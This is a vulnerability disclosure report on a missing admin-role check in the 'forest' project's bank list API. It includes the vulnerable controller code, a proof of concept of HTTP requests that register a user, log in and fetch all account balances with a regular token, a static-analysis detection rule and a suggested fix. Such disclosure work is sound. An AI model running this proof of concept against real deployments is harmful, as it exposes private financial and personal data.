## Title: [Unauthorized Access to Financial Data - Bank Account Information Exposure] in [forest] <= [v1.0]

# **BUG_Author:**  [intSheep,yaklang. io, IRify]

## Product Information
- **Software Link:** [https://github.com/rymcu/forest](https://github.com/rymcu/forest)
- **Affected Version:** <= v1.0
- **Vulnerability Type:** CWE-862 (Missing Authorization), CWE-359 (Exposure of Private Personal Information)

## Vulnerability Details

### Vulnerable Files
- `src/main/java/com/rymcu/forest/web/api/bank/BankController.java`

### Vulnerability Type
- **Missing Authorization** (CWE-862)
- **Exposure of Financial Information** (CWE-359)
- **Broken Access Control** (OWASP Top 10 2021 - A01:2021)
- **Sensitive Data Exposure** (OWASP Top 10 2021 - A02:2021)

### Root Cause

**Critical Authorization Bypass Vulnerability:**

The application contains a **critical security flaw** in the bank management API where **ANY authenticated user (regardless of role)** can access sensitive financial information including all bank accounts, account balances, bank owners, and transaction details. This endpoint is located under `/api/v1/admin/bank/` path, clearly indicating it should be restricted to administrators, yet while JWT authentication is enforced by Shiro filter chain, there is NO role-based authorization check to ensure the user is an administrator.

**Vulnerable Code Analysis:**

```java
// BankController.java - Lines 20-35
@RestController
@RequestMapping("/api/v1/admin/bank")  // ‚ö†Ô∏è Path contains "admin" but has NO admin check!
public class BankController {

    @Resource
    private BankService bankService;

    // ‚ùå CRITICAL - No authentication, no authorization, complete exposure
    @GetMapping("/list")
    public GlobalResult<PageInfo<BankDTO>> banks(
            @RequestParam(defaultValue = "0") Integer page, 
            @RequestParam(defaultValue = "10") Integer rows) {
        PageHelper.startPage(page, rows);
        List<BankDTO> list = bankService.findBanks();  // Returns ALL banks with balances
        PageInfo<BankDTO> pageInfo = new PageInfo(list);
        return GlobalResultGenerator.genSuccessResult(pageInfo);
    }
}
```

**Exposed Data Structure:**

```java
// BankDTO.java - Complete financial data exposure
@Data
public class BankDTO {
    private Integer idBank;
    private String bankName;              // ‚Üê Bank name
    private Integer bankOwner;            // ‚Üê Owner user ID
    private String bankOwnerName;         // ‚Üê Owner real name
    private String bankAccount;           // ‚Üê Account number
    private BigDecimal accountBalance;    // ‚Üê üí∞ BALANCE EXPOSED!
    private String bankDescription;       // ‚Üê Business purpose
    private Integer createdBy;            // ‚Üê Creator ID
    private Date createdTime;             // ‚Üê Creation timestamp
}
```

**Example Response (Sensitive Data):**

```json
{
  "code": 0,
  "data": {
    "endRow": 2,
    "hasNextPage": false,
    "hasPreviousPage": false,
    "isFirstPage": true,
    "isLastPage": true,
    "list": [
      {
        "accountBalance": 1207980, // <- BALANCE EXPOSED!
        "bankAccount": "100000002",
        "bankDescription": "Á§æÂå∫ÂèëÂ±ï‰∏éÊîπÈù©Èì∂Ë°å",
        "bankName": "Á§æÂå∫ÂèëÂ±ï‰∏éÊîπÈù©Èì∂Ë°å",
        "bankOwner": 1,
        "createdBy": 1,
        "createdTime": "2020-11-26 21:31:27",
        "idBank": 2
      },
      {
        "accountBalance": 997500000,
        "bankAccount": "100000001",
        "bankDescription": "Á§æÂå∫‰∏≠Â§ÆÈì∂Ë°å",
        "bankName": "Á§æÂå∫‰∏≠Â§ÆÈì∂Ë°å",
        "bankOwner": 1,
        "createdBy": 1,
        "createdTime": "2020-11-26 21:24:19",
        "idBank": 1
      }
    ],
    "navigateFirstPage": 1,
    "navigateLastPage": 1,
    "navigatePages": 8,
    "navigatepageNums": [
      1
    ],
    "nextPage": 0,
    "pageNum": 1,
    "pageSize": 10,
    "pages": 1,
    "prePage": 0,
    "size": 2,
    "startRow": 1,
    "total": 2
  },
  "success": true
}
```

**Security Issues:**

1. **JWT Authentication Present But Insufficient**: While Shiro's JWT filter (`/**` rule) requires valid authentication, this alone is not enough for admin endpoints.

2. **Missing Role-Based Authorization**: Despite the `/admin/` path prefix clearly indicating admin-only access, there is NO `@RequiresRoles(value = "admin")` annotation to enforce administrator privileges.

3. **Privilege Escalation**: Any regular user with a valid JWT token can access administrative financial data, bypassing role-based access control.

4. **Complete Financial Disclosure**: All sensitive financial data is exposed to ANY logged-in user:
   - Total platform funds
   - Individual account balances
   - Account owners' identities
   - Business purposes of accounts
   - Internal account structure

5. **Business Intelligence Leak**: Competitors or malicious users can register accounts and analyze:
   - Platform's total capital
   - Financial health indicators
   - Resource allocation strategy
   - Revenue/expenditure patterns

6. **Privacy Violation**: Personal information exposed to all users:
   - Bank owner names (real names)
   - User IDs of administrators
   - Internal organizational structure

7. **Shiro Filter Chain Misconfiguration**: The `/admin/**` path is protected by JWT filter but lacks role enforcement, demonstrating incomplete security configuration.

### Impact

This vulnerability has **HIGH** severity with the following impacts:

#### 1. **Financial Data Exposure**
Complete exposure of platform financial information:
- **Total Platform Funds**: Attackers can calculate exact platform capital
- **Account Balances**: All virtual currency reserves exposed
- **Revenue Insights**: Activity pools reveal business strategy
- **User Wealth**: Individual user bank account balances visible


#### 2. **Competitive Intelligence Leak**
Competitors can easily gain strategic insights:
- **Step 1**: Register a regular user account (free, no verification required)
- **Step 2**: Login to obtain valid JWT token
- **Step 3**: Access admin financial endpoints with user-level token
- **Step 4**: Extract complete financial intelligence

**Attack Scenario:**
```
1. Competitor registers account: user@competitor.com
2. Obtains JWT token via /api/v1/auth/login
3. Accesses /api/v1/admin/bank/list with regular user token
4. Records all account balances (succeeds despite being non-admin!)
5. Repeats daily for 30 days to track trends
6. Analyzes data to understand:
   - User growth rate
   - Revenue generation
   - Expense patterns
   - Financial health
```

#### 3. **Targeted Social Engineering**
Exposed owner information enables attacks:
- Phishing attacks targeting bank owners
- Impersonation of financial administrators
- Social engineering using leaked organizational structure
- Targeted attacks on high-value accounts

### Affected Endpoints

| Endpoint | Method | Required Role | Actual Protection | Impact |
|----------|--------|---------------|-------------------|---------|
| `/api/v1/admin/bank/list` | GET | Admin | ‚ùå **NONE** | Financial Data Exposure |


**Expected vs Actual Security:**

```java
// EXPECTED (Secure):
@GetMapping("/list")
@RequiresRoles(value = "admin")  // ‚Üê Should be here!
public GlobalResult<PageInfo<BankDTO>> banks(...) { ... }

// ACTUAL (Vulnerable):
@GetMapping("/list")
// ‚Üê NO AUTHORIZATION!
public GlobalResult<PageInfo<BankDTO>> banks(...) { ... }
```

## Proof of Concept

### Step 1: Setup - Register Regular User and Obtain Token

**First, register a regular (non-admin) user:**
```http
POST /api/console/register HTTP/1.1
Host: 127.0.0.1:3000
fingerprint: 00ca00ef0022001b
Accept: application/json, text/plain, */*
Origin: http://127.0.0.1:3000
Referer: http://127.0.0.1:3000/register
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json

{"email":"123465@qq.com","password":"123456","code":"test"}
```

**Then login to get JWT token:**
```http
POST /api/auth/login HTTP/1.1
Host: 127.0.0.1:3000
Referer: http://127.0.0.1:3000/login
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Origin: http://127.0.0.1:3000
Accept: application/json, text/plain, */*
fingerprint: 00ca00ef0022001b
Content-Type: application/json
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 50

{"account":"123456@qq.com","password":"123456"}
```

**Response:**
```json
{"code":0,"data":{"refreshToken":"01K882DEGY7A4VKZ486BMZ7C1R","token":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIxMjM0NTYiLCJzdWIiOiIxMjM0NTYiLCJpYXQiOjE3NjEyMDc1NjR9.eRufZLNFibqLhmZzyKtr8u3dk2cNFGO5g3QtPK99xgU"},"success":true}
```

**[SCREENSHOT PLACEHOLDER - Regular user login response showing non-admin role]**

---

### Step 2: visit bank list endpoint with regular user token

**Request with Regular User Token:**
```http
GET /api/admin/bank/list HTTP/1.1
Host: 127.0.0.1:3000
fingerprint: 00ca00ef0022001b
Referer: http://127.0.0.1:3000/portfolios?page=1
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Authorization: eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIxMjM0NTYiLCJzdWIiOiIxMjM0NTYiLCJpYXQiOjE3NjEyMDc2MzV9.tNGMCTj2ujjJ4-ypix8ZJedFLXU9E7Viu40mUhz7uL0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
```

**Response:**
![img.png](image/bank_img_1.png)

---

## Code Scan Evidence

### Discovery via Static Analysis

This vulnerability was discovered with the assistance of **[IRify](https://ssa.to)**, an advanced static code analysis tool for security vulnerability detection.

**IRify Detection Rule:**
```yaml
*Controller?{opcode:make}.__ref__?{!have:/(OpenData|OpenAi|Auth|Answer|LuceneSearch|Article|CommonApi)Controller/}?{!.annotation.*?{any:RequiresPermissions,RequiresRoles}} as   $NotAuthClass

  $NotAuthClass.*?{opcode:function} as $func
  $func?{!.annotation.*?{any:RequiresPermissions,AuthorshipInterceptor}} as $NotAnnoAuthFunc

  $NotAnnoAuthFunc?{!<foreach_function_inst()>?{have:"getCurrentUserByToken"}} as $NotAnyAuthFunc

  alert $NotAnyAuthFunc for {
  level:mid,
  message:"Ë∂äÊùÉ"
  risk:"Ë∂äÊùÉ"
}
```

**IRify Audit Results:**
![img.png](image/bank_img_2.png)



## Suggested Repairs

### 1. **Immediate Fix (Critical Priority)**

Add mandatory admin role requirement:

```java
package com.rymcu.forest.web.api.bank;

import com.github.pagehelper.PageHelper;
import com.github.pagehelper.PageInfo;
import com.rymcu.forest.core.result.GlobalResult;
import com.rymcu.forest.core.result.GlobalResultGenerator;
import com.rymcu.forest.dto.BankDTO;
import com.rymcu.forest.service.BankService;
import org.apache.shiro.authz.annotation.RequiresRoles;  // ‚Üê Import annotation
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import javax.annotation.Resource;
import java.util.List;

@RestController
@RequestMapping("/api/v1/admin/bank")
public class BankController {

    @Resource
    private BankService bankService;

    // ‚úÖ FIXED: Require admin role
    @GetMapping("/list")
    @RequiresRoles(value = "admin")  // ‚Üê ADD THIS LINE
    public GlobalResult<PageInfo<BankDTO>> banks(
            @RequestParam(defaultValue = "0") Integer page, 
            @RequestParam(defaultValue = "10") Integer rows) {
        PageHelper.startPage(page, rows);
        List<BankDTO> list = bankService.findBanks();
        PageInfo<BankDTO> pageInfo = new PageInfo(list);
        return GlobalResultGenerator.genSuccessResult(pageInfo);
    }
}
```


### 2. **Enhanced Security - Sensitive Data Filtering**

Even for admins, consider masking some sensitive fields:

```java
package com.rymcu.forest.dto;

import com.alibaba.fastjson.annotation.JSONField;
import com.fasterxml.jackson.annotation.JsonIgnore;
import lombok.Data;

import java.math.BigDecimal;
import java.util.Date;

@Data
public class BankDTO {
    private Integer idBank;
    private String bankName;
    private Integer bankOwner;
    private String bankOwnerName;
    
    // ‚úÖ Sensitive fields - control visibility
    private String bankAccount;
    
    @JSONField(serialize = false)  // Don't serialize in normal list view
    private BigDecimal accountBalance;
    
    private String bankDescription;
    
    @JsonIgnore  // Hide creator info
    private Integer createdBy;
    
    private Date createdTime;
    
    // ‚úÖ Add computed field for safe display
    public String getMaskedBankAccount() {
        if (bankAccount != null && bankAccount.length() > 8) {
            return bankAccount.substring(0, 4) + "****" + 
                   bankAccount.substring(bankAccount.length() - 4);
        }
        return "****";
    }
    
    // ‚úÖ Only expose balance range instead of exact amount
    public String getBalanceRange() {
        if (accountBalance == null) {
            return "Êú™Áü•";
        }
        
        BigDecimal balance = accountBalance;
        if (balance.compareTo(new BigDecimal("100000")) < 0) {
            return "0-10‰∏á";
        } else if (balance.compareTo(new BigDecimal("500000")) < 0) {
            return "10-50‰∏á";
        } else if (balance.compareTo(new BigDecimal("1000000")) < 0) {
            return "50-100‰∏á";
        } else {
            return "100‰∏á+";
        }
    }
}
```

## Additional Information

### References
- CWE-862: Missing Authorization
- CWE-359: Exposure of Private Personal Information to an Unauthorized Actor
- CWE-639: Authorization Bypass Through User-Controlled Key
- OWASP Top 10 2021 - A01:2021 Broken Access Control
- OWASP Top 10 2021 - A02:2021 Cryptographic Failures
- PCI DSS Requirement 7: Restrict access to cardholder data
- GDPR Article 32: Security of processing

## Conclusion

This vulnerability represents a **HIGH/CRITICAL security flaw** that exposes sensitive financial information to unauthenticated users, violating the principle of least privilege and potentially causing significant business harm.
